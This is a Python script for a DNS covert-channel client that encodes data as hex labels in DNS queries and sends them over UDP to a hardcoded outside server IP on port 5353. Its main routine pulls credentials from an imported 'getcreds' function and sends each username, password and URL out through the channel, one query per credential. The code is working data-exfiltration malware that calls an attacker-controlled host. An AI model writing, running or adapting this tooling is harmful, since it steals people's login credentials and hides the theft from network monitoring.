#!/usr/bin/env python3
"""
DNS Client for covert communication - Improved version with diagnostics
Sends data encoded in DNS queries
"""

import socket
import struct
import time
import sys
from creds import getcreds

class DNSClient:
    def __init__(self, server_ip, server_port, domain):
        """
        Initialize DNS client
        
        Args:
            server_ip: IP address of DNS server
            server_port: Port of DNS server
            domain: Domain name to query
        """
        self.server_ip = server_ip
        self.server_port = server_port
        self.domain = domain.lower()
        self.transaction_id = 0
        self.sock = None
        self.create_socket()
    
    def create_socket(self):
        """Create UDP socket"""
        if self.sock:
            self.sock.close()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(5.0)  # 5 second timeout
    
    def test_connection(self):
        """Test if we can reach the DNS server"""
        print(f"\n[*] Testing connection to {self.server_ip}:{self.server_port}...")
        
        try:
            # Send a simple DNS query
            test_query = self.create_dns_query(f"test.{self.domain}")
            
            print(f"[*] Sending test packet ({len(test_query)} bytes)...")
            self.sock.sendto(test_query, (self.server_ip, self.server_port))
            
            print(f"[*] Waiting for response (timeout: 5 seconds)...")
            try:
                response, addr = self.sock.recvfrom(512)
                print(f"[+] SUCCESS! Received response from {addr[0]}:{addr[1]}")
                print(f"[+] Response size: {len(response)} bytes")
                return True
            except socket.timeout:
                print(f"[!] TIMEOUT - No response received")
                print(f"[!] Possible issues:")
                print(f"    - Server is not running")
                print(f"    - Firewall blocking UDP port {self.server_port}")
                print(f"    - Wrong IP address")
                print(f"    - Network connectivity issue")
                return False
                
        except Exception as e:
            print(f"[!] Connection test failed: {e}")
            return False
    
    def send_message(self, message):
        """
        Send a message via DNS query
        
        Args:
            message: String message to send
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Encode message as hex
            hex_message = message.encode('utf-8').hex()
            
            # Split into DNS labels (max 63 chars per label)
            labels = []
            max_label_len = 63
            
            for i in range(0, len(hex_message), max_label_len):
                labels.append(hex_message[i:i+max_label_len])
            
            # Create full domain name
            query_name = '.'.join(labels) + '.' + self.domain
            
            print(f"\n{'=' * 60}")
            print(f"[*] Sending message: '{message}'")
            print(f"[*] Message length: {len(message)} chars")
            print(f"[*] Hex encoded: {hex_message[:40]}{'...' if len(hex_message) > 40 else ''}")
            print(f"[*] DNS query: {query_name}")
            print(f"[*] Destination: {self.server_ip}:{self.server_port}")
            
            # Create DNS query
            query = self.create_dns_query(query_name)
            print(f"[*] Query packet size: {len(query)} bytes")
            
            # Send query
            print(f"[*] Sending packet...")
            bytes_sent = self.sock.sendto(query, (self.server_ip, self.server_port))
            print(f"[+] Sent {bytes_sent} bytes")
            
            # Wait for response
            print(f"[*] Waiting for response...")
            try:
                response, addr = self.sock.recvfrom(512)
                print(f"[+] Response received from {addr[0]}:{addr[1]}")
                print(f"[+] Response size: {len(response)} bytes")
                self.parse_dns_response(response)
                print(f"{'=' * 60}\n")
                return True
            except socket.timeout:
                print(f"[!] TIMEOUT - No response received")
                print(f"[!] Message was sent but server didn't respond")
                print(f"{'=' * 60}\n")
                return False
                
        except Exception as e:
            print(f"[!] Error sending message: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def create_dns_query(self, domain_name):
        """Create DNS query packet"""
        # Increment transaction ID
        self.transaction_id = (self.transaction_id + 1) % 65536
        
        # DNS Header
        query = struct.pack('!H', self.transaction_id)  # Transaction ID
        
        # Flags: Standard query, recursion desired
        flags = 0x0100
        query += struct.pack('!H', flags)
        
        # Questions: 1, Answers: 0, Authority: 0, Additional: 0
        query += struct.pack('!H', 1)  # QDCOUNT
        query += struct.pack('!H', 0)  # ANCOUNT
        query += struct.pack('!H', 0)  # NSCOUNT
        query += struct.pack('!H', 0)  # ARCOUNT
        
        # Question section
        for label in domain_name.split('.'):
            query += bytes([len(label)])
            query += label.encode('utf-8')
        query += b'\x00'  # End of domain name
        
        # Type A (1), Class IN (1)
        query += struct.pack('!H', 1)  # QTYPE
        query += struct.pack('!H', 1)  # QCLASS
        
        return query
    
    def parse_dns_response(self, response):
        """Parse DNS response packet"""
        if len(response) < 12:
            print("[!] Invalid response (too short)")
            return
        
        # Parse header
        transaction_id = struct.unpack('!H', response[0:2])[0]
        flags = struct.unpack('!H', response[2:4])[0]
        qdcount = struct.unpack('!H', response[4:6])[0]
        ancount = struct.unpack('!H', response[6:8])[0]
        
        # Check response code
        rcode = flags & 0x000F
        if rcode == 0:
            print("[+] DNS query successful (NOERROR)")
        else:
            error_codes = {
                1: "Format error",
                2: "Server failure",
                3: "Name error (domain doesn't exist)",
                4: "Not implemented",
                5: "Refused"
            }
            print(f"[!] DNS error: {error_codes.get(rcode, f'Unknown ({rcode})')}")
        
        if ancount > 0:
            print(f"[+] Received {ancount} answer(s)")
            
            # Skip question section to get to answers
            pos = 12
            for _ in range(qdcount):
                # Skip question name
                while pos < len(response) and response[pos] != 0:
                    if response[pos] >= 192:  # Compression pointer
                        pos += 2
                        break
                    else:
                        pos += response[pos] + 1
                else:
                    pos += 1
                pos += 4  # Skip QTYPE and QCLASS
            
            # Parse answer
            if pos < len(response):
                # Skip name (usually a pointer)
                if response[pos] >= 192:
                    pos += 2
                else:
                    while pos < len(response) and response[pos] != 0:
                        pos += response[pos] + 1
                    pos += 1
                
                if pos + 10 <= len(response):
                    answer_type = struct.unpack('!H', response[pos:pos+2])[0]
                    pos += 8  # Skip type, class, TTL
                    data_len = struct.unpack('!H', response[pos:pos+2])[0]
                    pos += 2
                    
                    if answer_type == 1 and data_len == 4:  # A record
                        ip = '.'.join(str(b) for b in response[pos:pos+4])
                        print(f"[+] Resolved to IP: {ip}")
    
    def close(self):
        """Close the socket"""
        if self.sock:
            self.sock.close()


def main():
    print("=" * 70)
    print(" DNS COVERT CHANNEL CLIENT ".center(70, "="))
    print("=" * 70)
    print()

    server_ip = "65.2.29.23"
    server_port = 5353
    domain = "covert.local"
    client = DNSClient(server_ip=server_ip, server_port=server_port, domain=domain)
    
    # Test connection first
    if not client.test_connection():
        print("\n[!] Connection test failed!")
        print("\nTroubleshooting steps:")
        print("1. Verify the server is running on AWS")
        print("2. Check AWS Security Group rules:")
        print(f"   - Add Inbound rule: UDP port {server_port} from your IP or 0.0.0.0/0")
        print("3. Verify you're using the correct AWS public IP")
        print("4. Check if AWS firewall (iptables/ufw) allows UDP traffic")
        print("5. Try running: sudo netstat -ulnp | grep <port> on the server")
        print("\nDo you want to continue anyway? (y/n): ", end='')
        
        if input().lower() != 'y':
            client.close()
            sys.exit(1)
    
    print()
    print("=" * 70)
    print("Ready to send messages. Type 'quit' to exit.")
    print("=" * 70)
    
    creds = getcreds()
    
    for i in creds:
        def defang_url(url):
        # Replace dots with [.] and http with hXXp
            return url.replace("http", "hXXp").replace(".", "[.]")
        url = i['url']
        safeurl = defang_url(url=url)
        percred = f"{i['uname']}:{i['pass']}@{safeurl}"
        client.send_message(percred)
    

if __name__ == '__main__':
    main()
